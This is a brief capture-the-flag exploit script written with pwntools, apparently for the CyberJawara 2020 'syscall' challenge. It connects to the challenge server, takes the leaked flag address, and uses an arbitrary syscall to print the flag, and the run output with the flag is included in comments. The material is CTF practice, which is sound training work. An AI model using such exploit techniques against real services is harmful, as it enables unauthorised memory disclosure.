from pwn import *

r = remote("pwn.cyber.jawara.systems",13371)
r.recvuntil('Alamat memori flag: ')
flag = int(r.recv().split()[0].replace(b"\n",b"\x00"),16)
log.info("flag : " + str(flag))
# r.sendline("16")
# r.sendlineafter(":","1")
# r.sendlineafter(":",str(flag))
# r.sendlineafter(":","10")
r.interactive()

# ~/code/ctf/CyberJawara-2020/quals/pwn/syscall » python sol.py                                                                                                                                                    tripoloski@pwnbox
# [+] Opening connection to pwn.cyber.jawara.systems on port 13371: Done
# [*] flag : 94849748077416
# [*] Switching to interactive mode
# $ 1
# arg0: $ 1
# arg1: $ 94849748077416
# arg2: $ 100
# arg3: $ a
# arg4: arg5: 
# Menjalankan syscall(1, 1, 94849748077416, 100, 94849748074560, 0, 194)
# CJ2020{pemanasan_dulu_ya_agan_sekalian}\x00>> CJ Syscall <<<\x00lamat memori flag: %p
# \x00omor syscall: \x00[*] Got EOF while reading in interactive
